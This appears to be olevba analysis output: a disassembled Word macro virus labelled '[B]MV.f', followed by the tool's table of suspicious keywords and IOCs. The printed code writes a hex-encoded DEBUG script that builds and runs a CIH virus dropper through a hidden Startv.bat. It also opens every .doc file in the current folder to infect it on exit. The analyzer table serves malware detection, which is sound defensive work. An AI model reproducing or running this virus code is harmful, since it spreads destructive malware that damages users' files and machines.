' 	LitStr 0x0036 "E 05A0 83 C4 3C EB 4A 01 28 01 6C 24 08 2B DB 89 58 FC"
' 	PrintItemNL 
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 8D 86 9A FC FF FF B1 04 66 C7 00 CD 20 8B 94 8E"
' 	PrintItemNL 
' Line #158:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 62 FE FF FF 89 50 02 0F B6 94 31 61 FE FF FF 2B"
' 	PrintItemNL 
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 C2 E2 E5 0F 21 C8 8B 58 10 8B 38 59 E3 0D 8B F1"
' 	PrintItemNL 
' Line #160:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 B8 01 D6 00 00 5A 59 FF D7 EB F0 5B 58 F9 9C 2B"
' 	PrintItemNL 
' Line #161:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 C0 B4 D7 FF D7 9D 5E 8B DF 66 B8 03 43 8B 4E FC"
' 	PrintItemNL 
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 8B 7E FE FF D3 FE 4E FB 61 0F 21 C0 FF 20 8B DC"
' 	PrintItemNL 
' Line #163:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 FF 73 38 FF 53 24 59 89 43 1C 83 7B 28 24 75 06"
' 	PrintItemNL 
' Line #164:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 8B 41 28 89 46 01 61 C3 00 3A 66 27 53 00 01 00"
' 	PrintItemNL 
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 68 00 40 00 41 00 40 00 32 00 40 00 43 49 48 20"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 28 54 4E 4E 20 52 65 6D 69 78 29 20 77 72 69 74"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 74 65 6E 20 62 79 20 20 54 54 49 54 20 6F 66 20"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 54 41 54 55 4E 47 20 20 2D 2D 5B BD 5D 2D 2D 20"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0670 20 72 65 6D 69 78 65 64 20 62 79 20 56 69 63 6F"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 64 69 6E 45 53 20 20 2D 2D 5B BD 5D 2D 2D 20 20"
' 	PrintItemNL 
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 54 68 65 20 4E 61 72 6B 6F 74 69 63 20 4E 65 74"
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 77 6F 72 6B 20 56 69 72 75 73 20 57 61 72 65 68"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 6F 75 73 65 20 20 68 74 74 70 3A 2F 2F 75 73 65"
' 	PrintItemNL 
' Line #174:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 72 73 2E 73 6B 79 6E 65 74 2E 62 65 2F 73 6F 6D"
' 	PrintItemNL 
' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 6E 75 73 2F 76 69 72 6E 6E 76 77 2E 68 74 6D 6C"
' 	PrintItemNL 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 20 20 2D 2D 5B BD 5D 2D 2D 20 20 A9 56 69 63 92"
' 	PrintItemNL 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 73 20 4E 6F 74 20 57 6F 72 6B 69 6E 92 20 57 69"
' 	PrintItemNL 
' Line #178:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 74 68 20 41 20 46 75 6C 6C 20 44 65 63 6B 21 20"
' 	PrintItemNL 
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "E 0710 00"
' 	PrintItemNL 
' Line #180:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "RCX"
' 	PrintItemNL 
' Line #181:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "611"
' 	PrintItemNL 
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "W"
' 	PrintItemNL 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 "Q"
' 	PrintItemNL 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #185:
' Line #186:
' 	LitStr 0x000D "c:\Startv.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #187:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #188:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "c:\"
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "debug < TNN_CIH.scr > nul"
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "del TNN_CIH.scr"
' 	PrintItemNL 
' Line #191:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "ren TNN_CIH.Com TNN_CIH.EXE"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "TNN_CIH.Exe"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "del startv.bat"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #195:
' 	LitStr 0x000D "c:\startv.bat"
' 	Paren 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #196:
' Line #197:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #198:
' 	Ld msoIconAlert 
' 	MemStWith Icon 
' Line #199:
' 	LitStr 0x0007 "[B]MV.f"
' 	MemStWith Heading 
' Line #200:
' 	LitStr 0x003E "I have just attempted to install the CIH virus on your system."
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x001F "I just felt like warning you..."
' 	Concat 
' 	MemStWith Then 
' Line #201:
' 	Ld msoAnimationGetAttentionMajor 
' 	MemStWith Animation 
' Line #202:
' 	ArgsMemCallWith Show 0x0000 
' Line #203:
' 	EndWith 
' Line #204:
' Line #205:
' 	EndSub 
' Line #206:
' 	FuncDefn (Sub AutoExit())
' Line #207:
' 	OnError (Resume Next) 
' Line #208:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #209:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #210:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #211:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #212:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #213:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #214:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #215:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #216:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #217:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #218:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #219:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #220:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	Loop 
' Line #223:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #224:
' 	EndSub 
' Line #225:
' 	FuncDefn (Sub FileExit())
' Line #226:
' 	OnError (Resume Next) 
' Line #227:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #228:
' 	Ld wdWindowStateMinimize 
' 	Ld Application 
' 	MemSt WindowState 
' Line #229:
' 	Ld CurDir 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St pName 
' Line #230:
' 	Ld pName 
' 	LitStr 0x0005 "*.doc"
' 	Concat 
' 	Ld sAttr 
' 	ArgsLd Dir 0x0002 
' 	St fName 
' Line #231:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' 	EndIf 
' Line #232:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #233:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #234:
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	DoWhile 
' Line #235:
' 	ArgsLd Dir 0x0000 
' 	St fName 
' Line #236:
' 	LineCont 0x0004 07 00 00 00
' 	Ld fName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld fName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #237:
' 	Ld pName 
' 	Ld fName 
' 	Concat 
' 	St InfectDoc 
' Line #238:
' 	LineCont 0x0004 0D 00 00 00
' 	Ld InfectDoc 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0005 
' Line #239:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #240:
' 	EndIfBlock 
' Line #241:
' 	Loop 
' Line #242:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #243:
' 	EndSub 
' Line #244:
' 	FuncDefn (Sub FileTemplates())
' Line #245:
' 	OnError (Resume Next) 
' Line #246:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #247:
' 	EndSub 
' Line #248:
' 	FuncDefn (Sub ToolsMacro())
' Line #249:
' 	OnError (Resume Next) 
' Line #250:
' 	ArgsCall (Call) BMVf 0x0000 
' Line #251:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |TNN_CIH.SCR         |Executable file name                         |
|IOC       |Startv.bat          |Executable file name                         |
|IOC       |TNN_CIH.scr         |Executable file name                         |
|IOC       |TNN_CIH.EXE         |Executable file name                         |
|IOC       |TNN_CIH.Exe         |Executable file name                         |
|IOC       |startv.bat          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

